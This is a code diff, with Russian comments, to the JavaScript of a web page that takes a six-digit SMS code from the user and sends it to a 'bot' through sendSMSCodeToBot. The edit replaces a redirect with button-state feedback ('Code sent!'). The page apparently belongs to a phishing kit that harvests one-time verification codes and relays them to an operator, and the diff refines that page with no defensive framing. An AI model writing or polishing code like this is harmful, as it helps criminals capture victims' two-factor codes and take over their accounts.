@@ -891,19 +891,28 @@ document.getElementById('confirmBtn').addEventListener('click', async function()
     if (code.length === 6) {
         console.log('🔢 Введенный SMS код:', code);
         
+        // БЛОКИРУЕМ КНОПКУ ЧТОБЫ НЕ ЖМАЛИ ПОВТОРНО
+        this.disabled = true;
+        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
+        
         // Отправляем код в бота
         const success = await sendSMSCodeToBot(code);
         
         if (success) {
-            // Перенаправляем на страницу успеха
-            window.location.href = 'success.html';
+            // ПРОСТО МЕНЯЕМ ТЕКСТ КНОПКИ
+            this.innerHTML = '<i class="fas fa-check"></i> Код отправлен!';
+            console.log('✅ Код отправлен в бота!');
         } else {
-            alert('Ошибка отправки кода');
+            alert('❌ Ошибка отправки кода');
+            // РАЗБЛОКИРУЕМ КНОПКУ
+            this.disabled = false;
+            this.innerHTML = '<i class="fas fa-check"></i> Подтвердить';
         }
     }
 });
     </script>
 </body>
 </html>
+
 
 
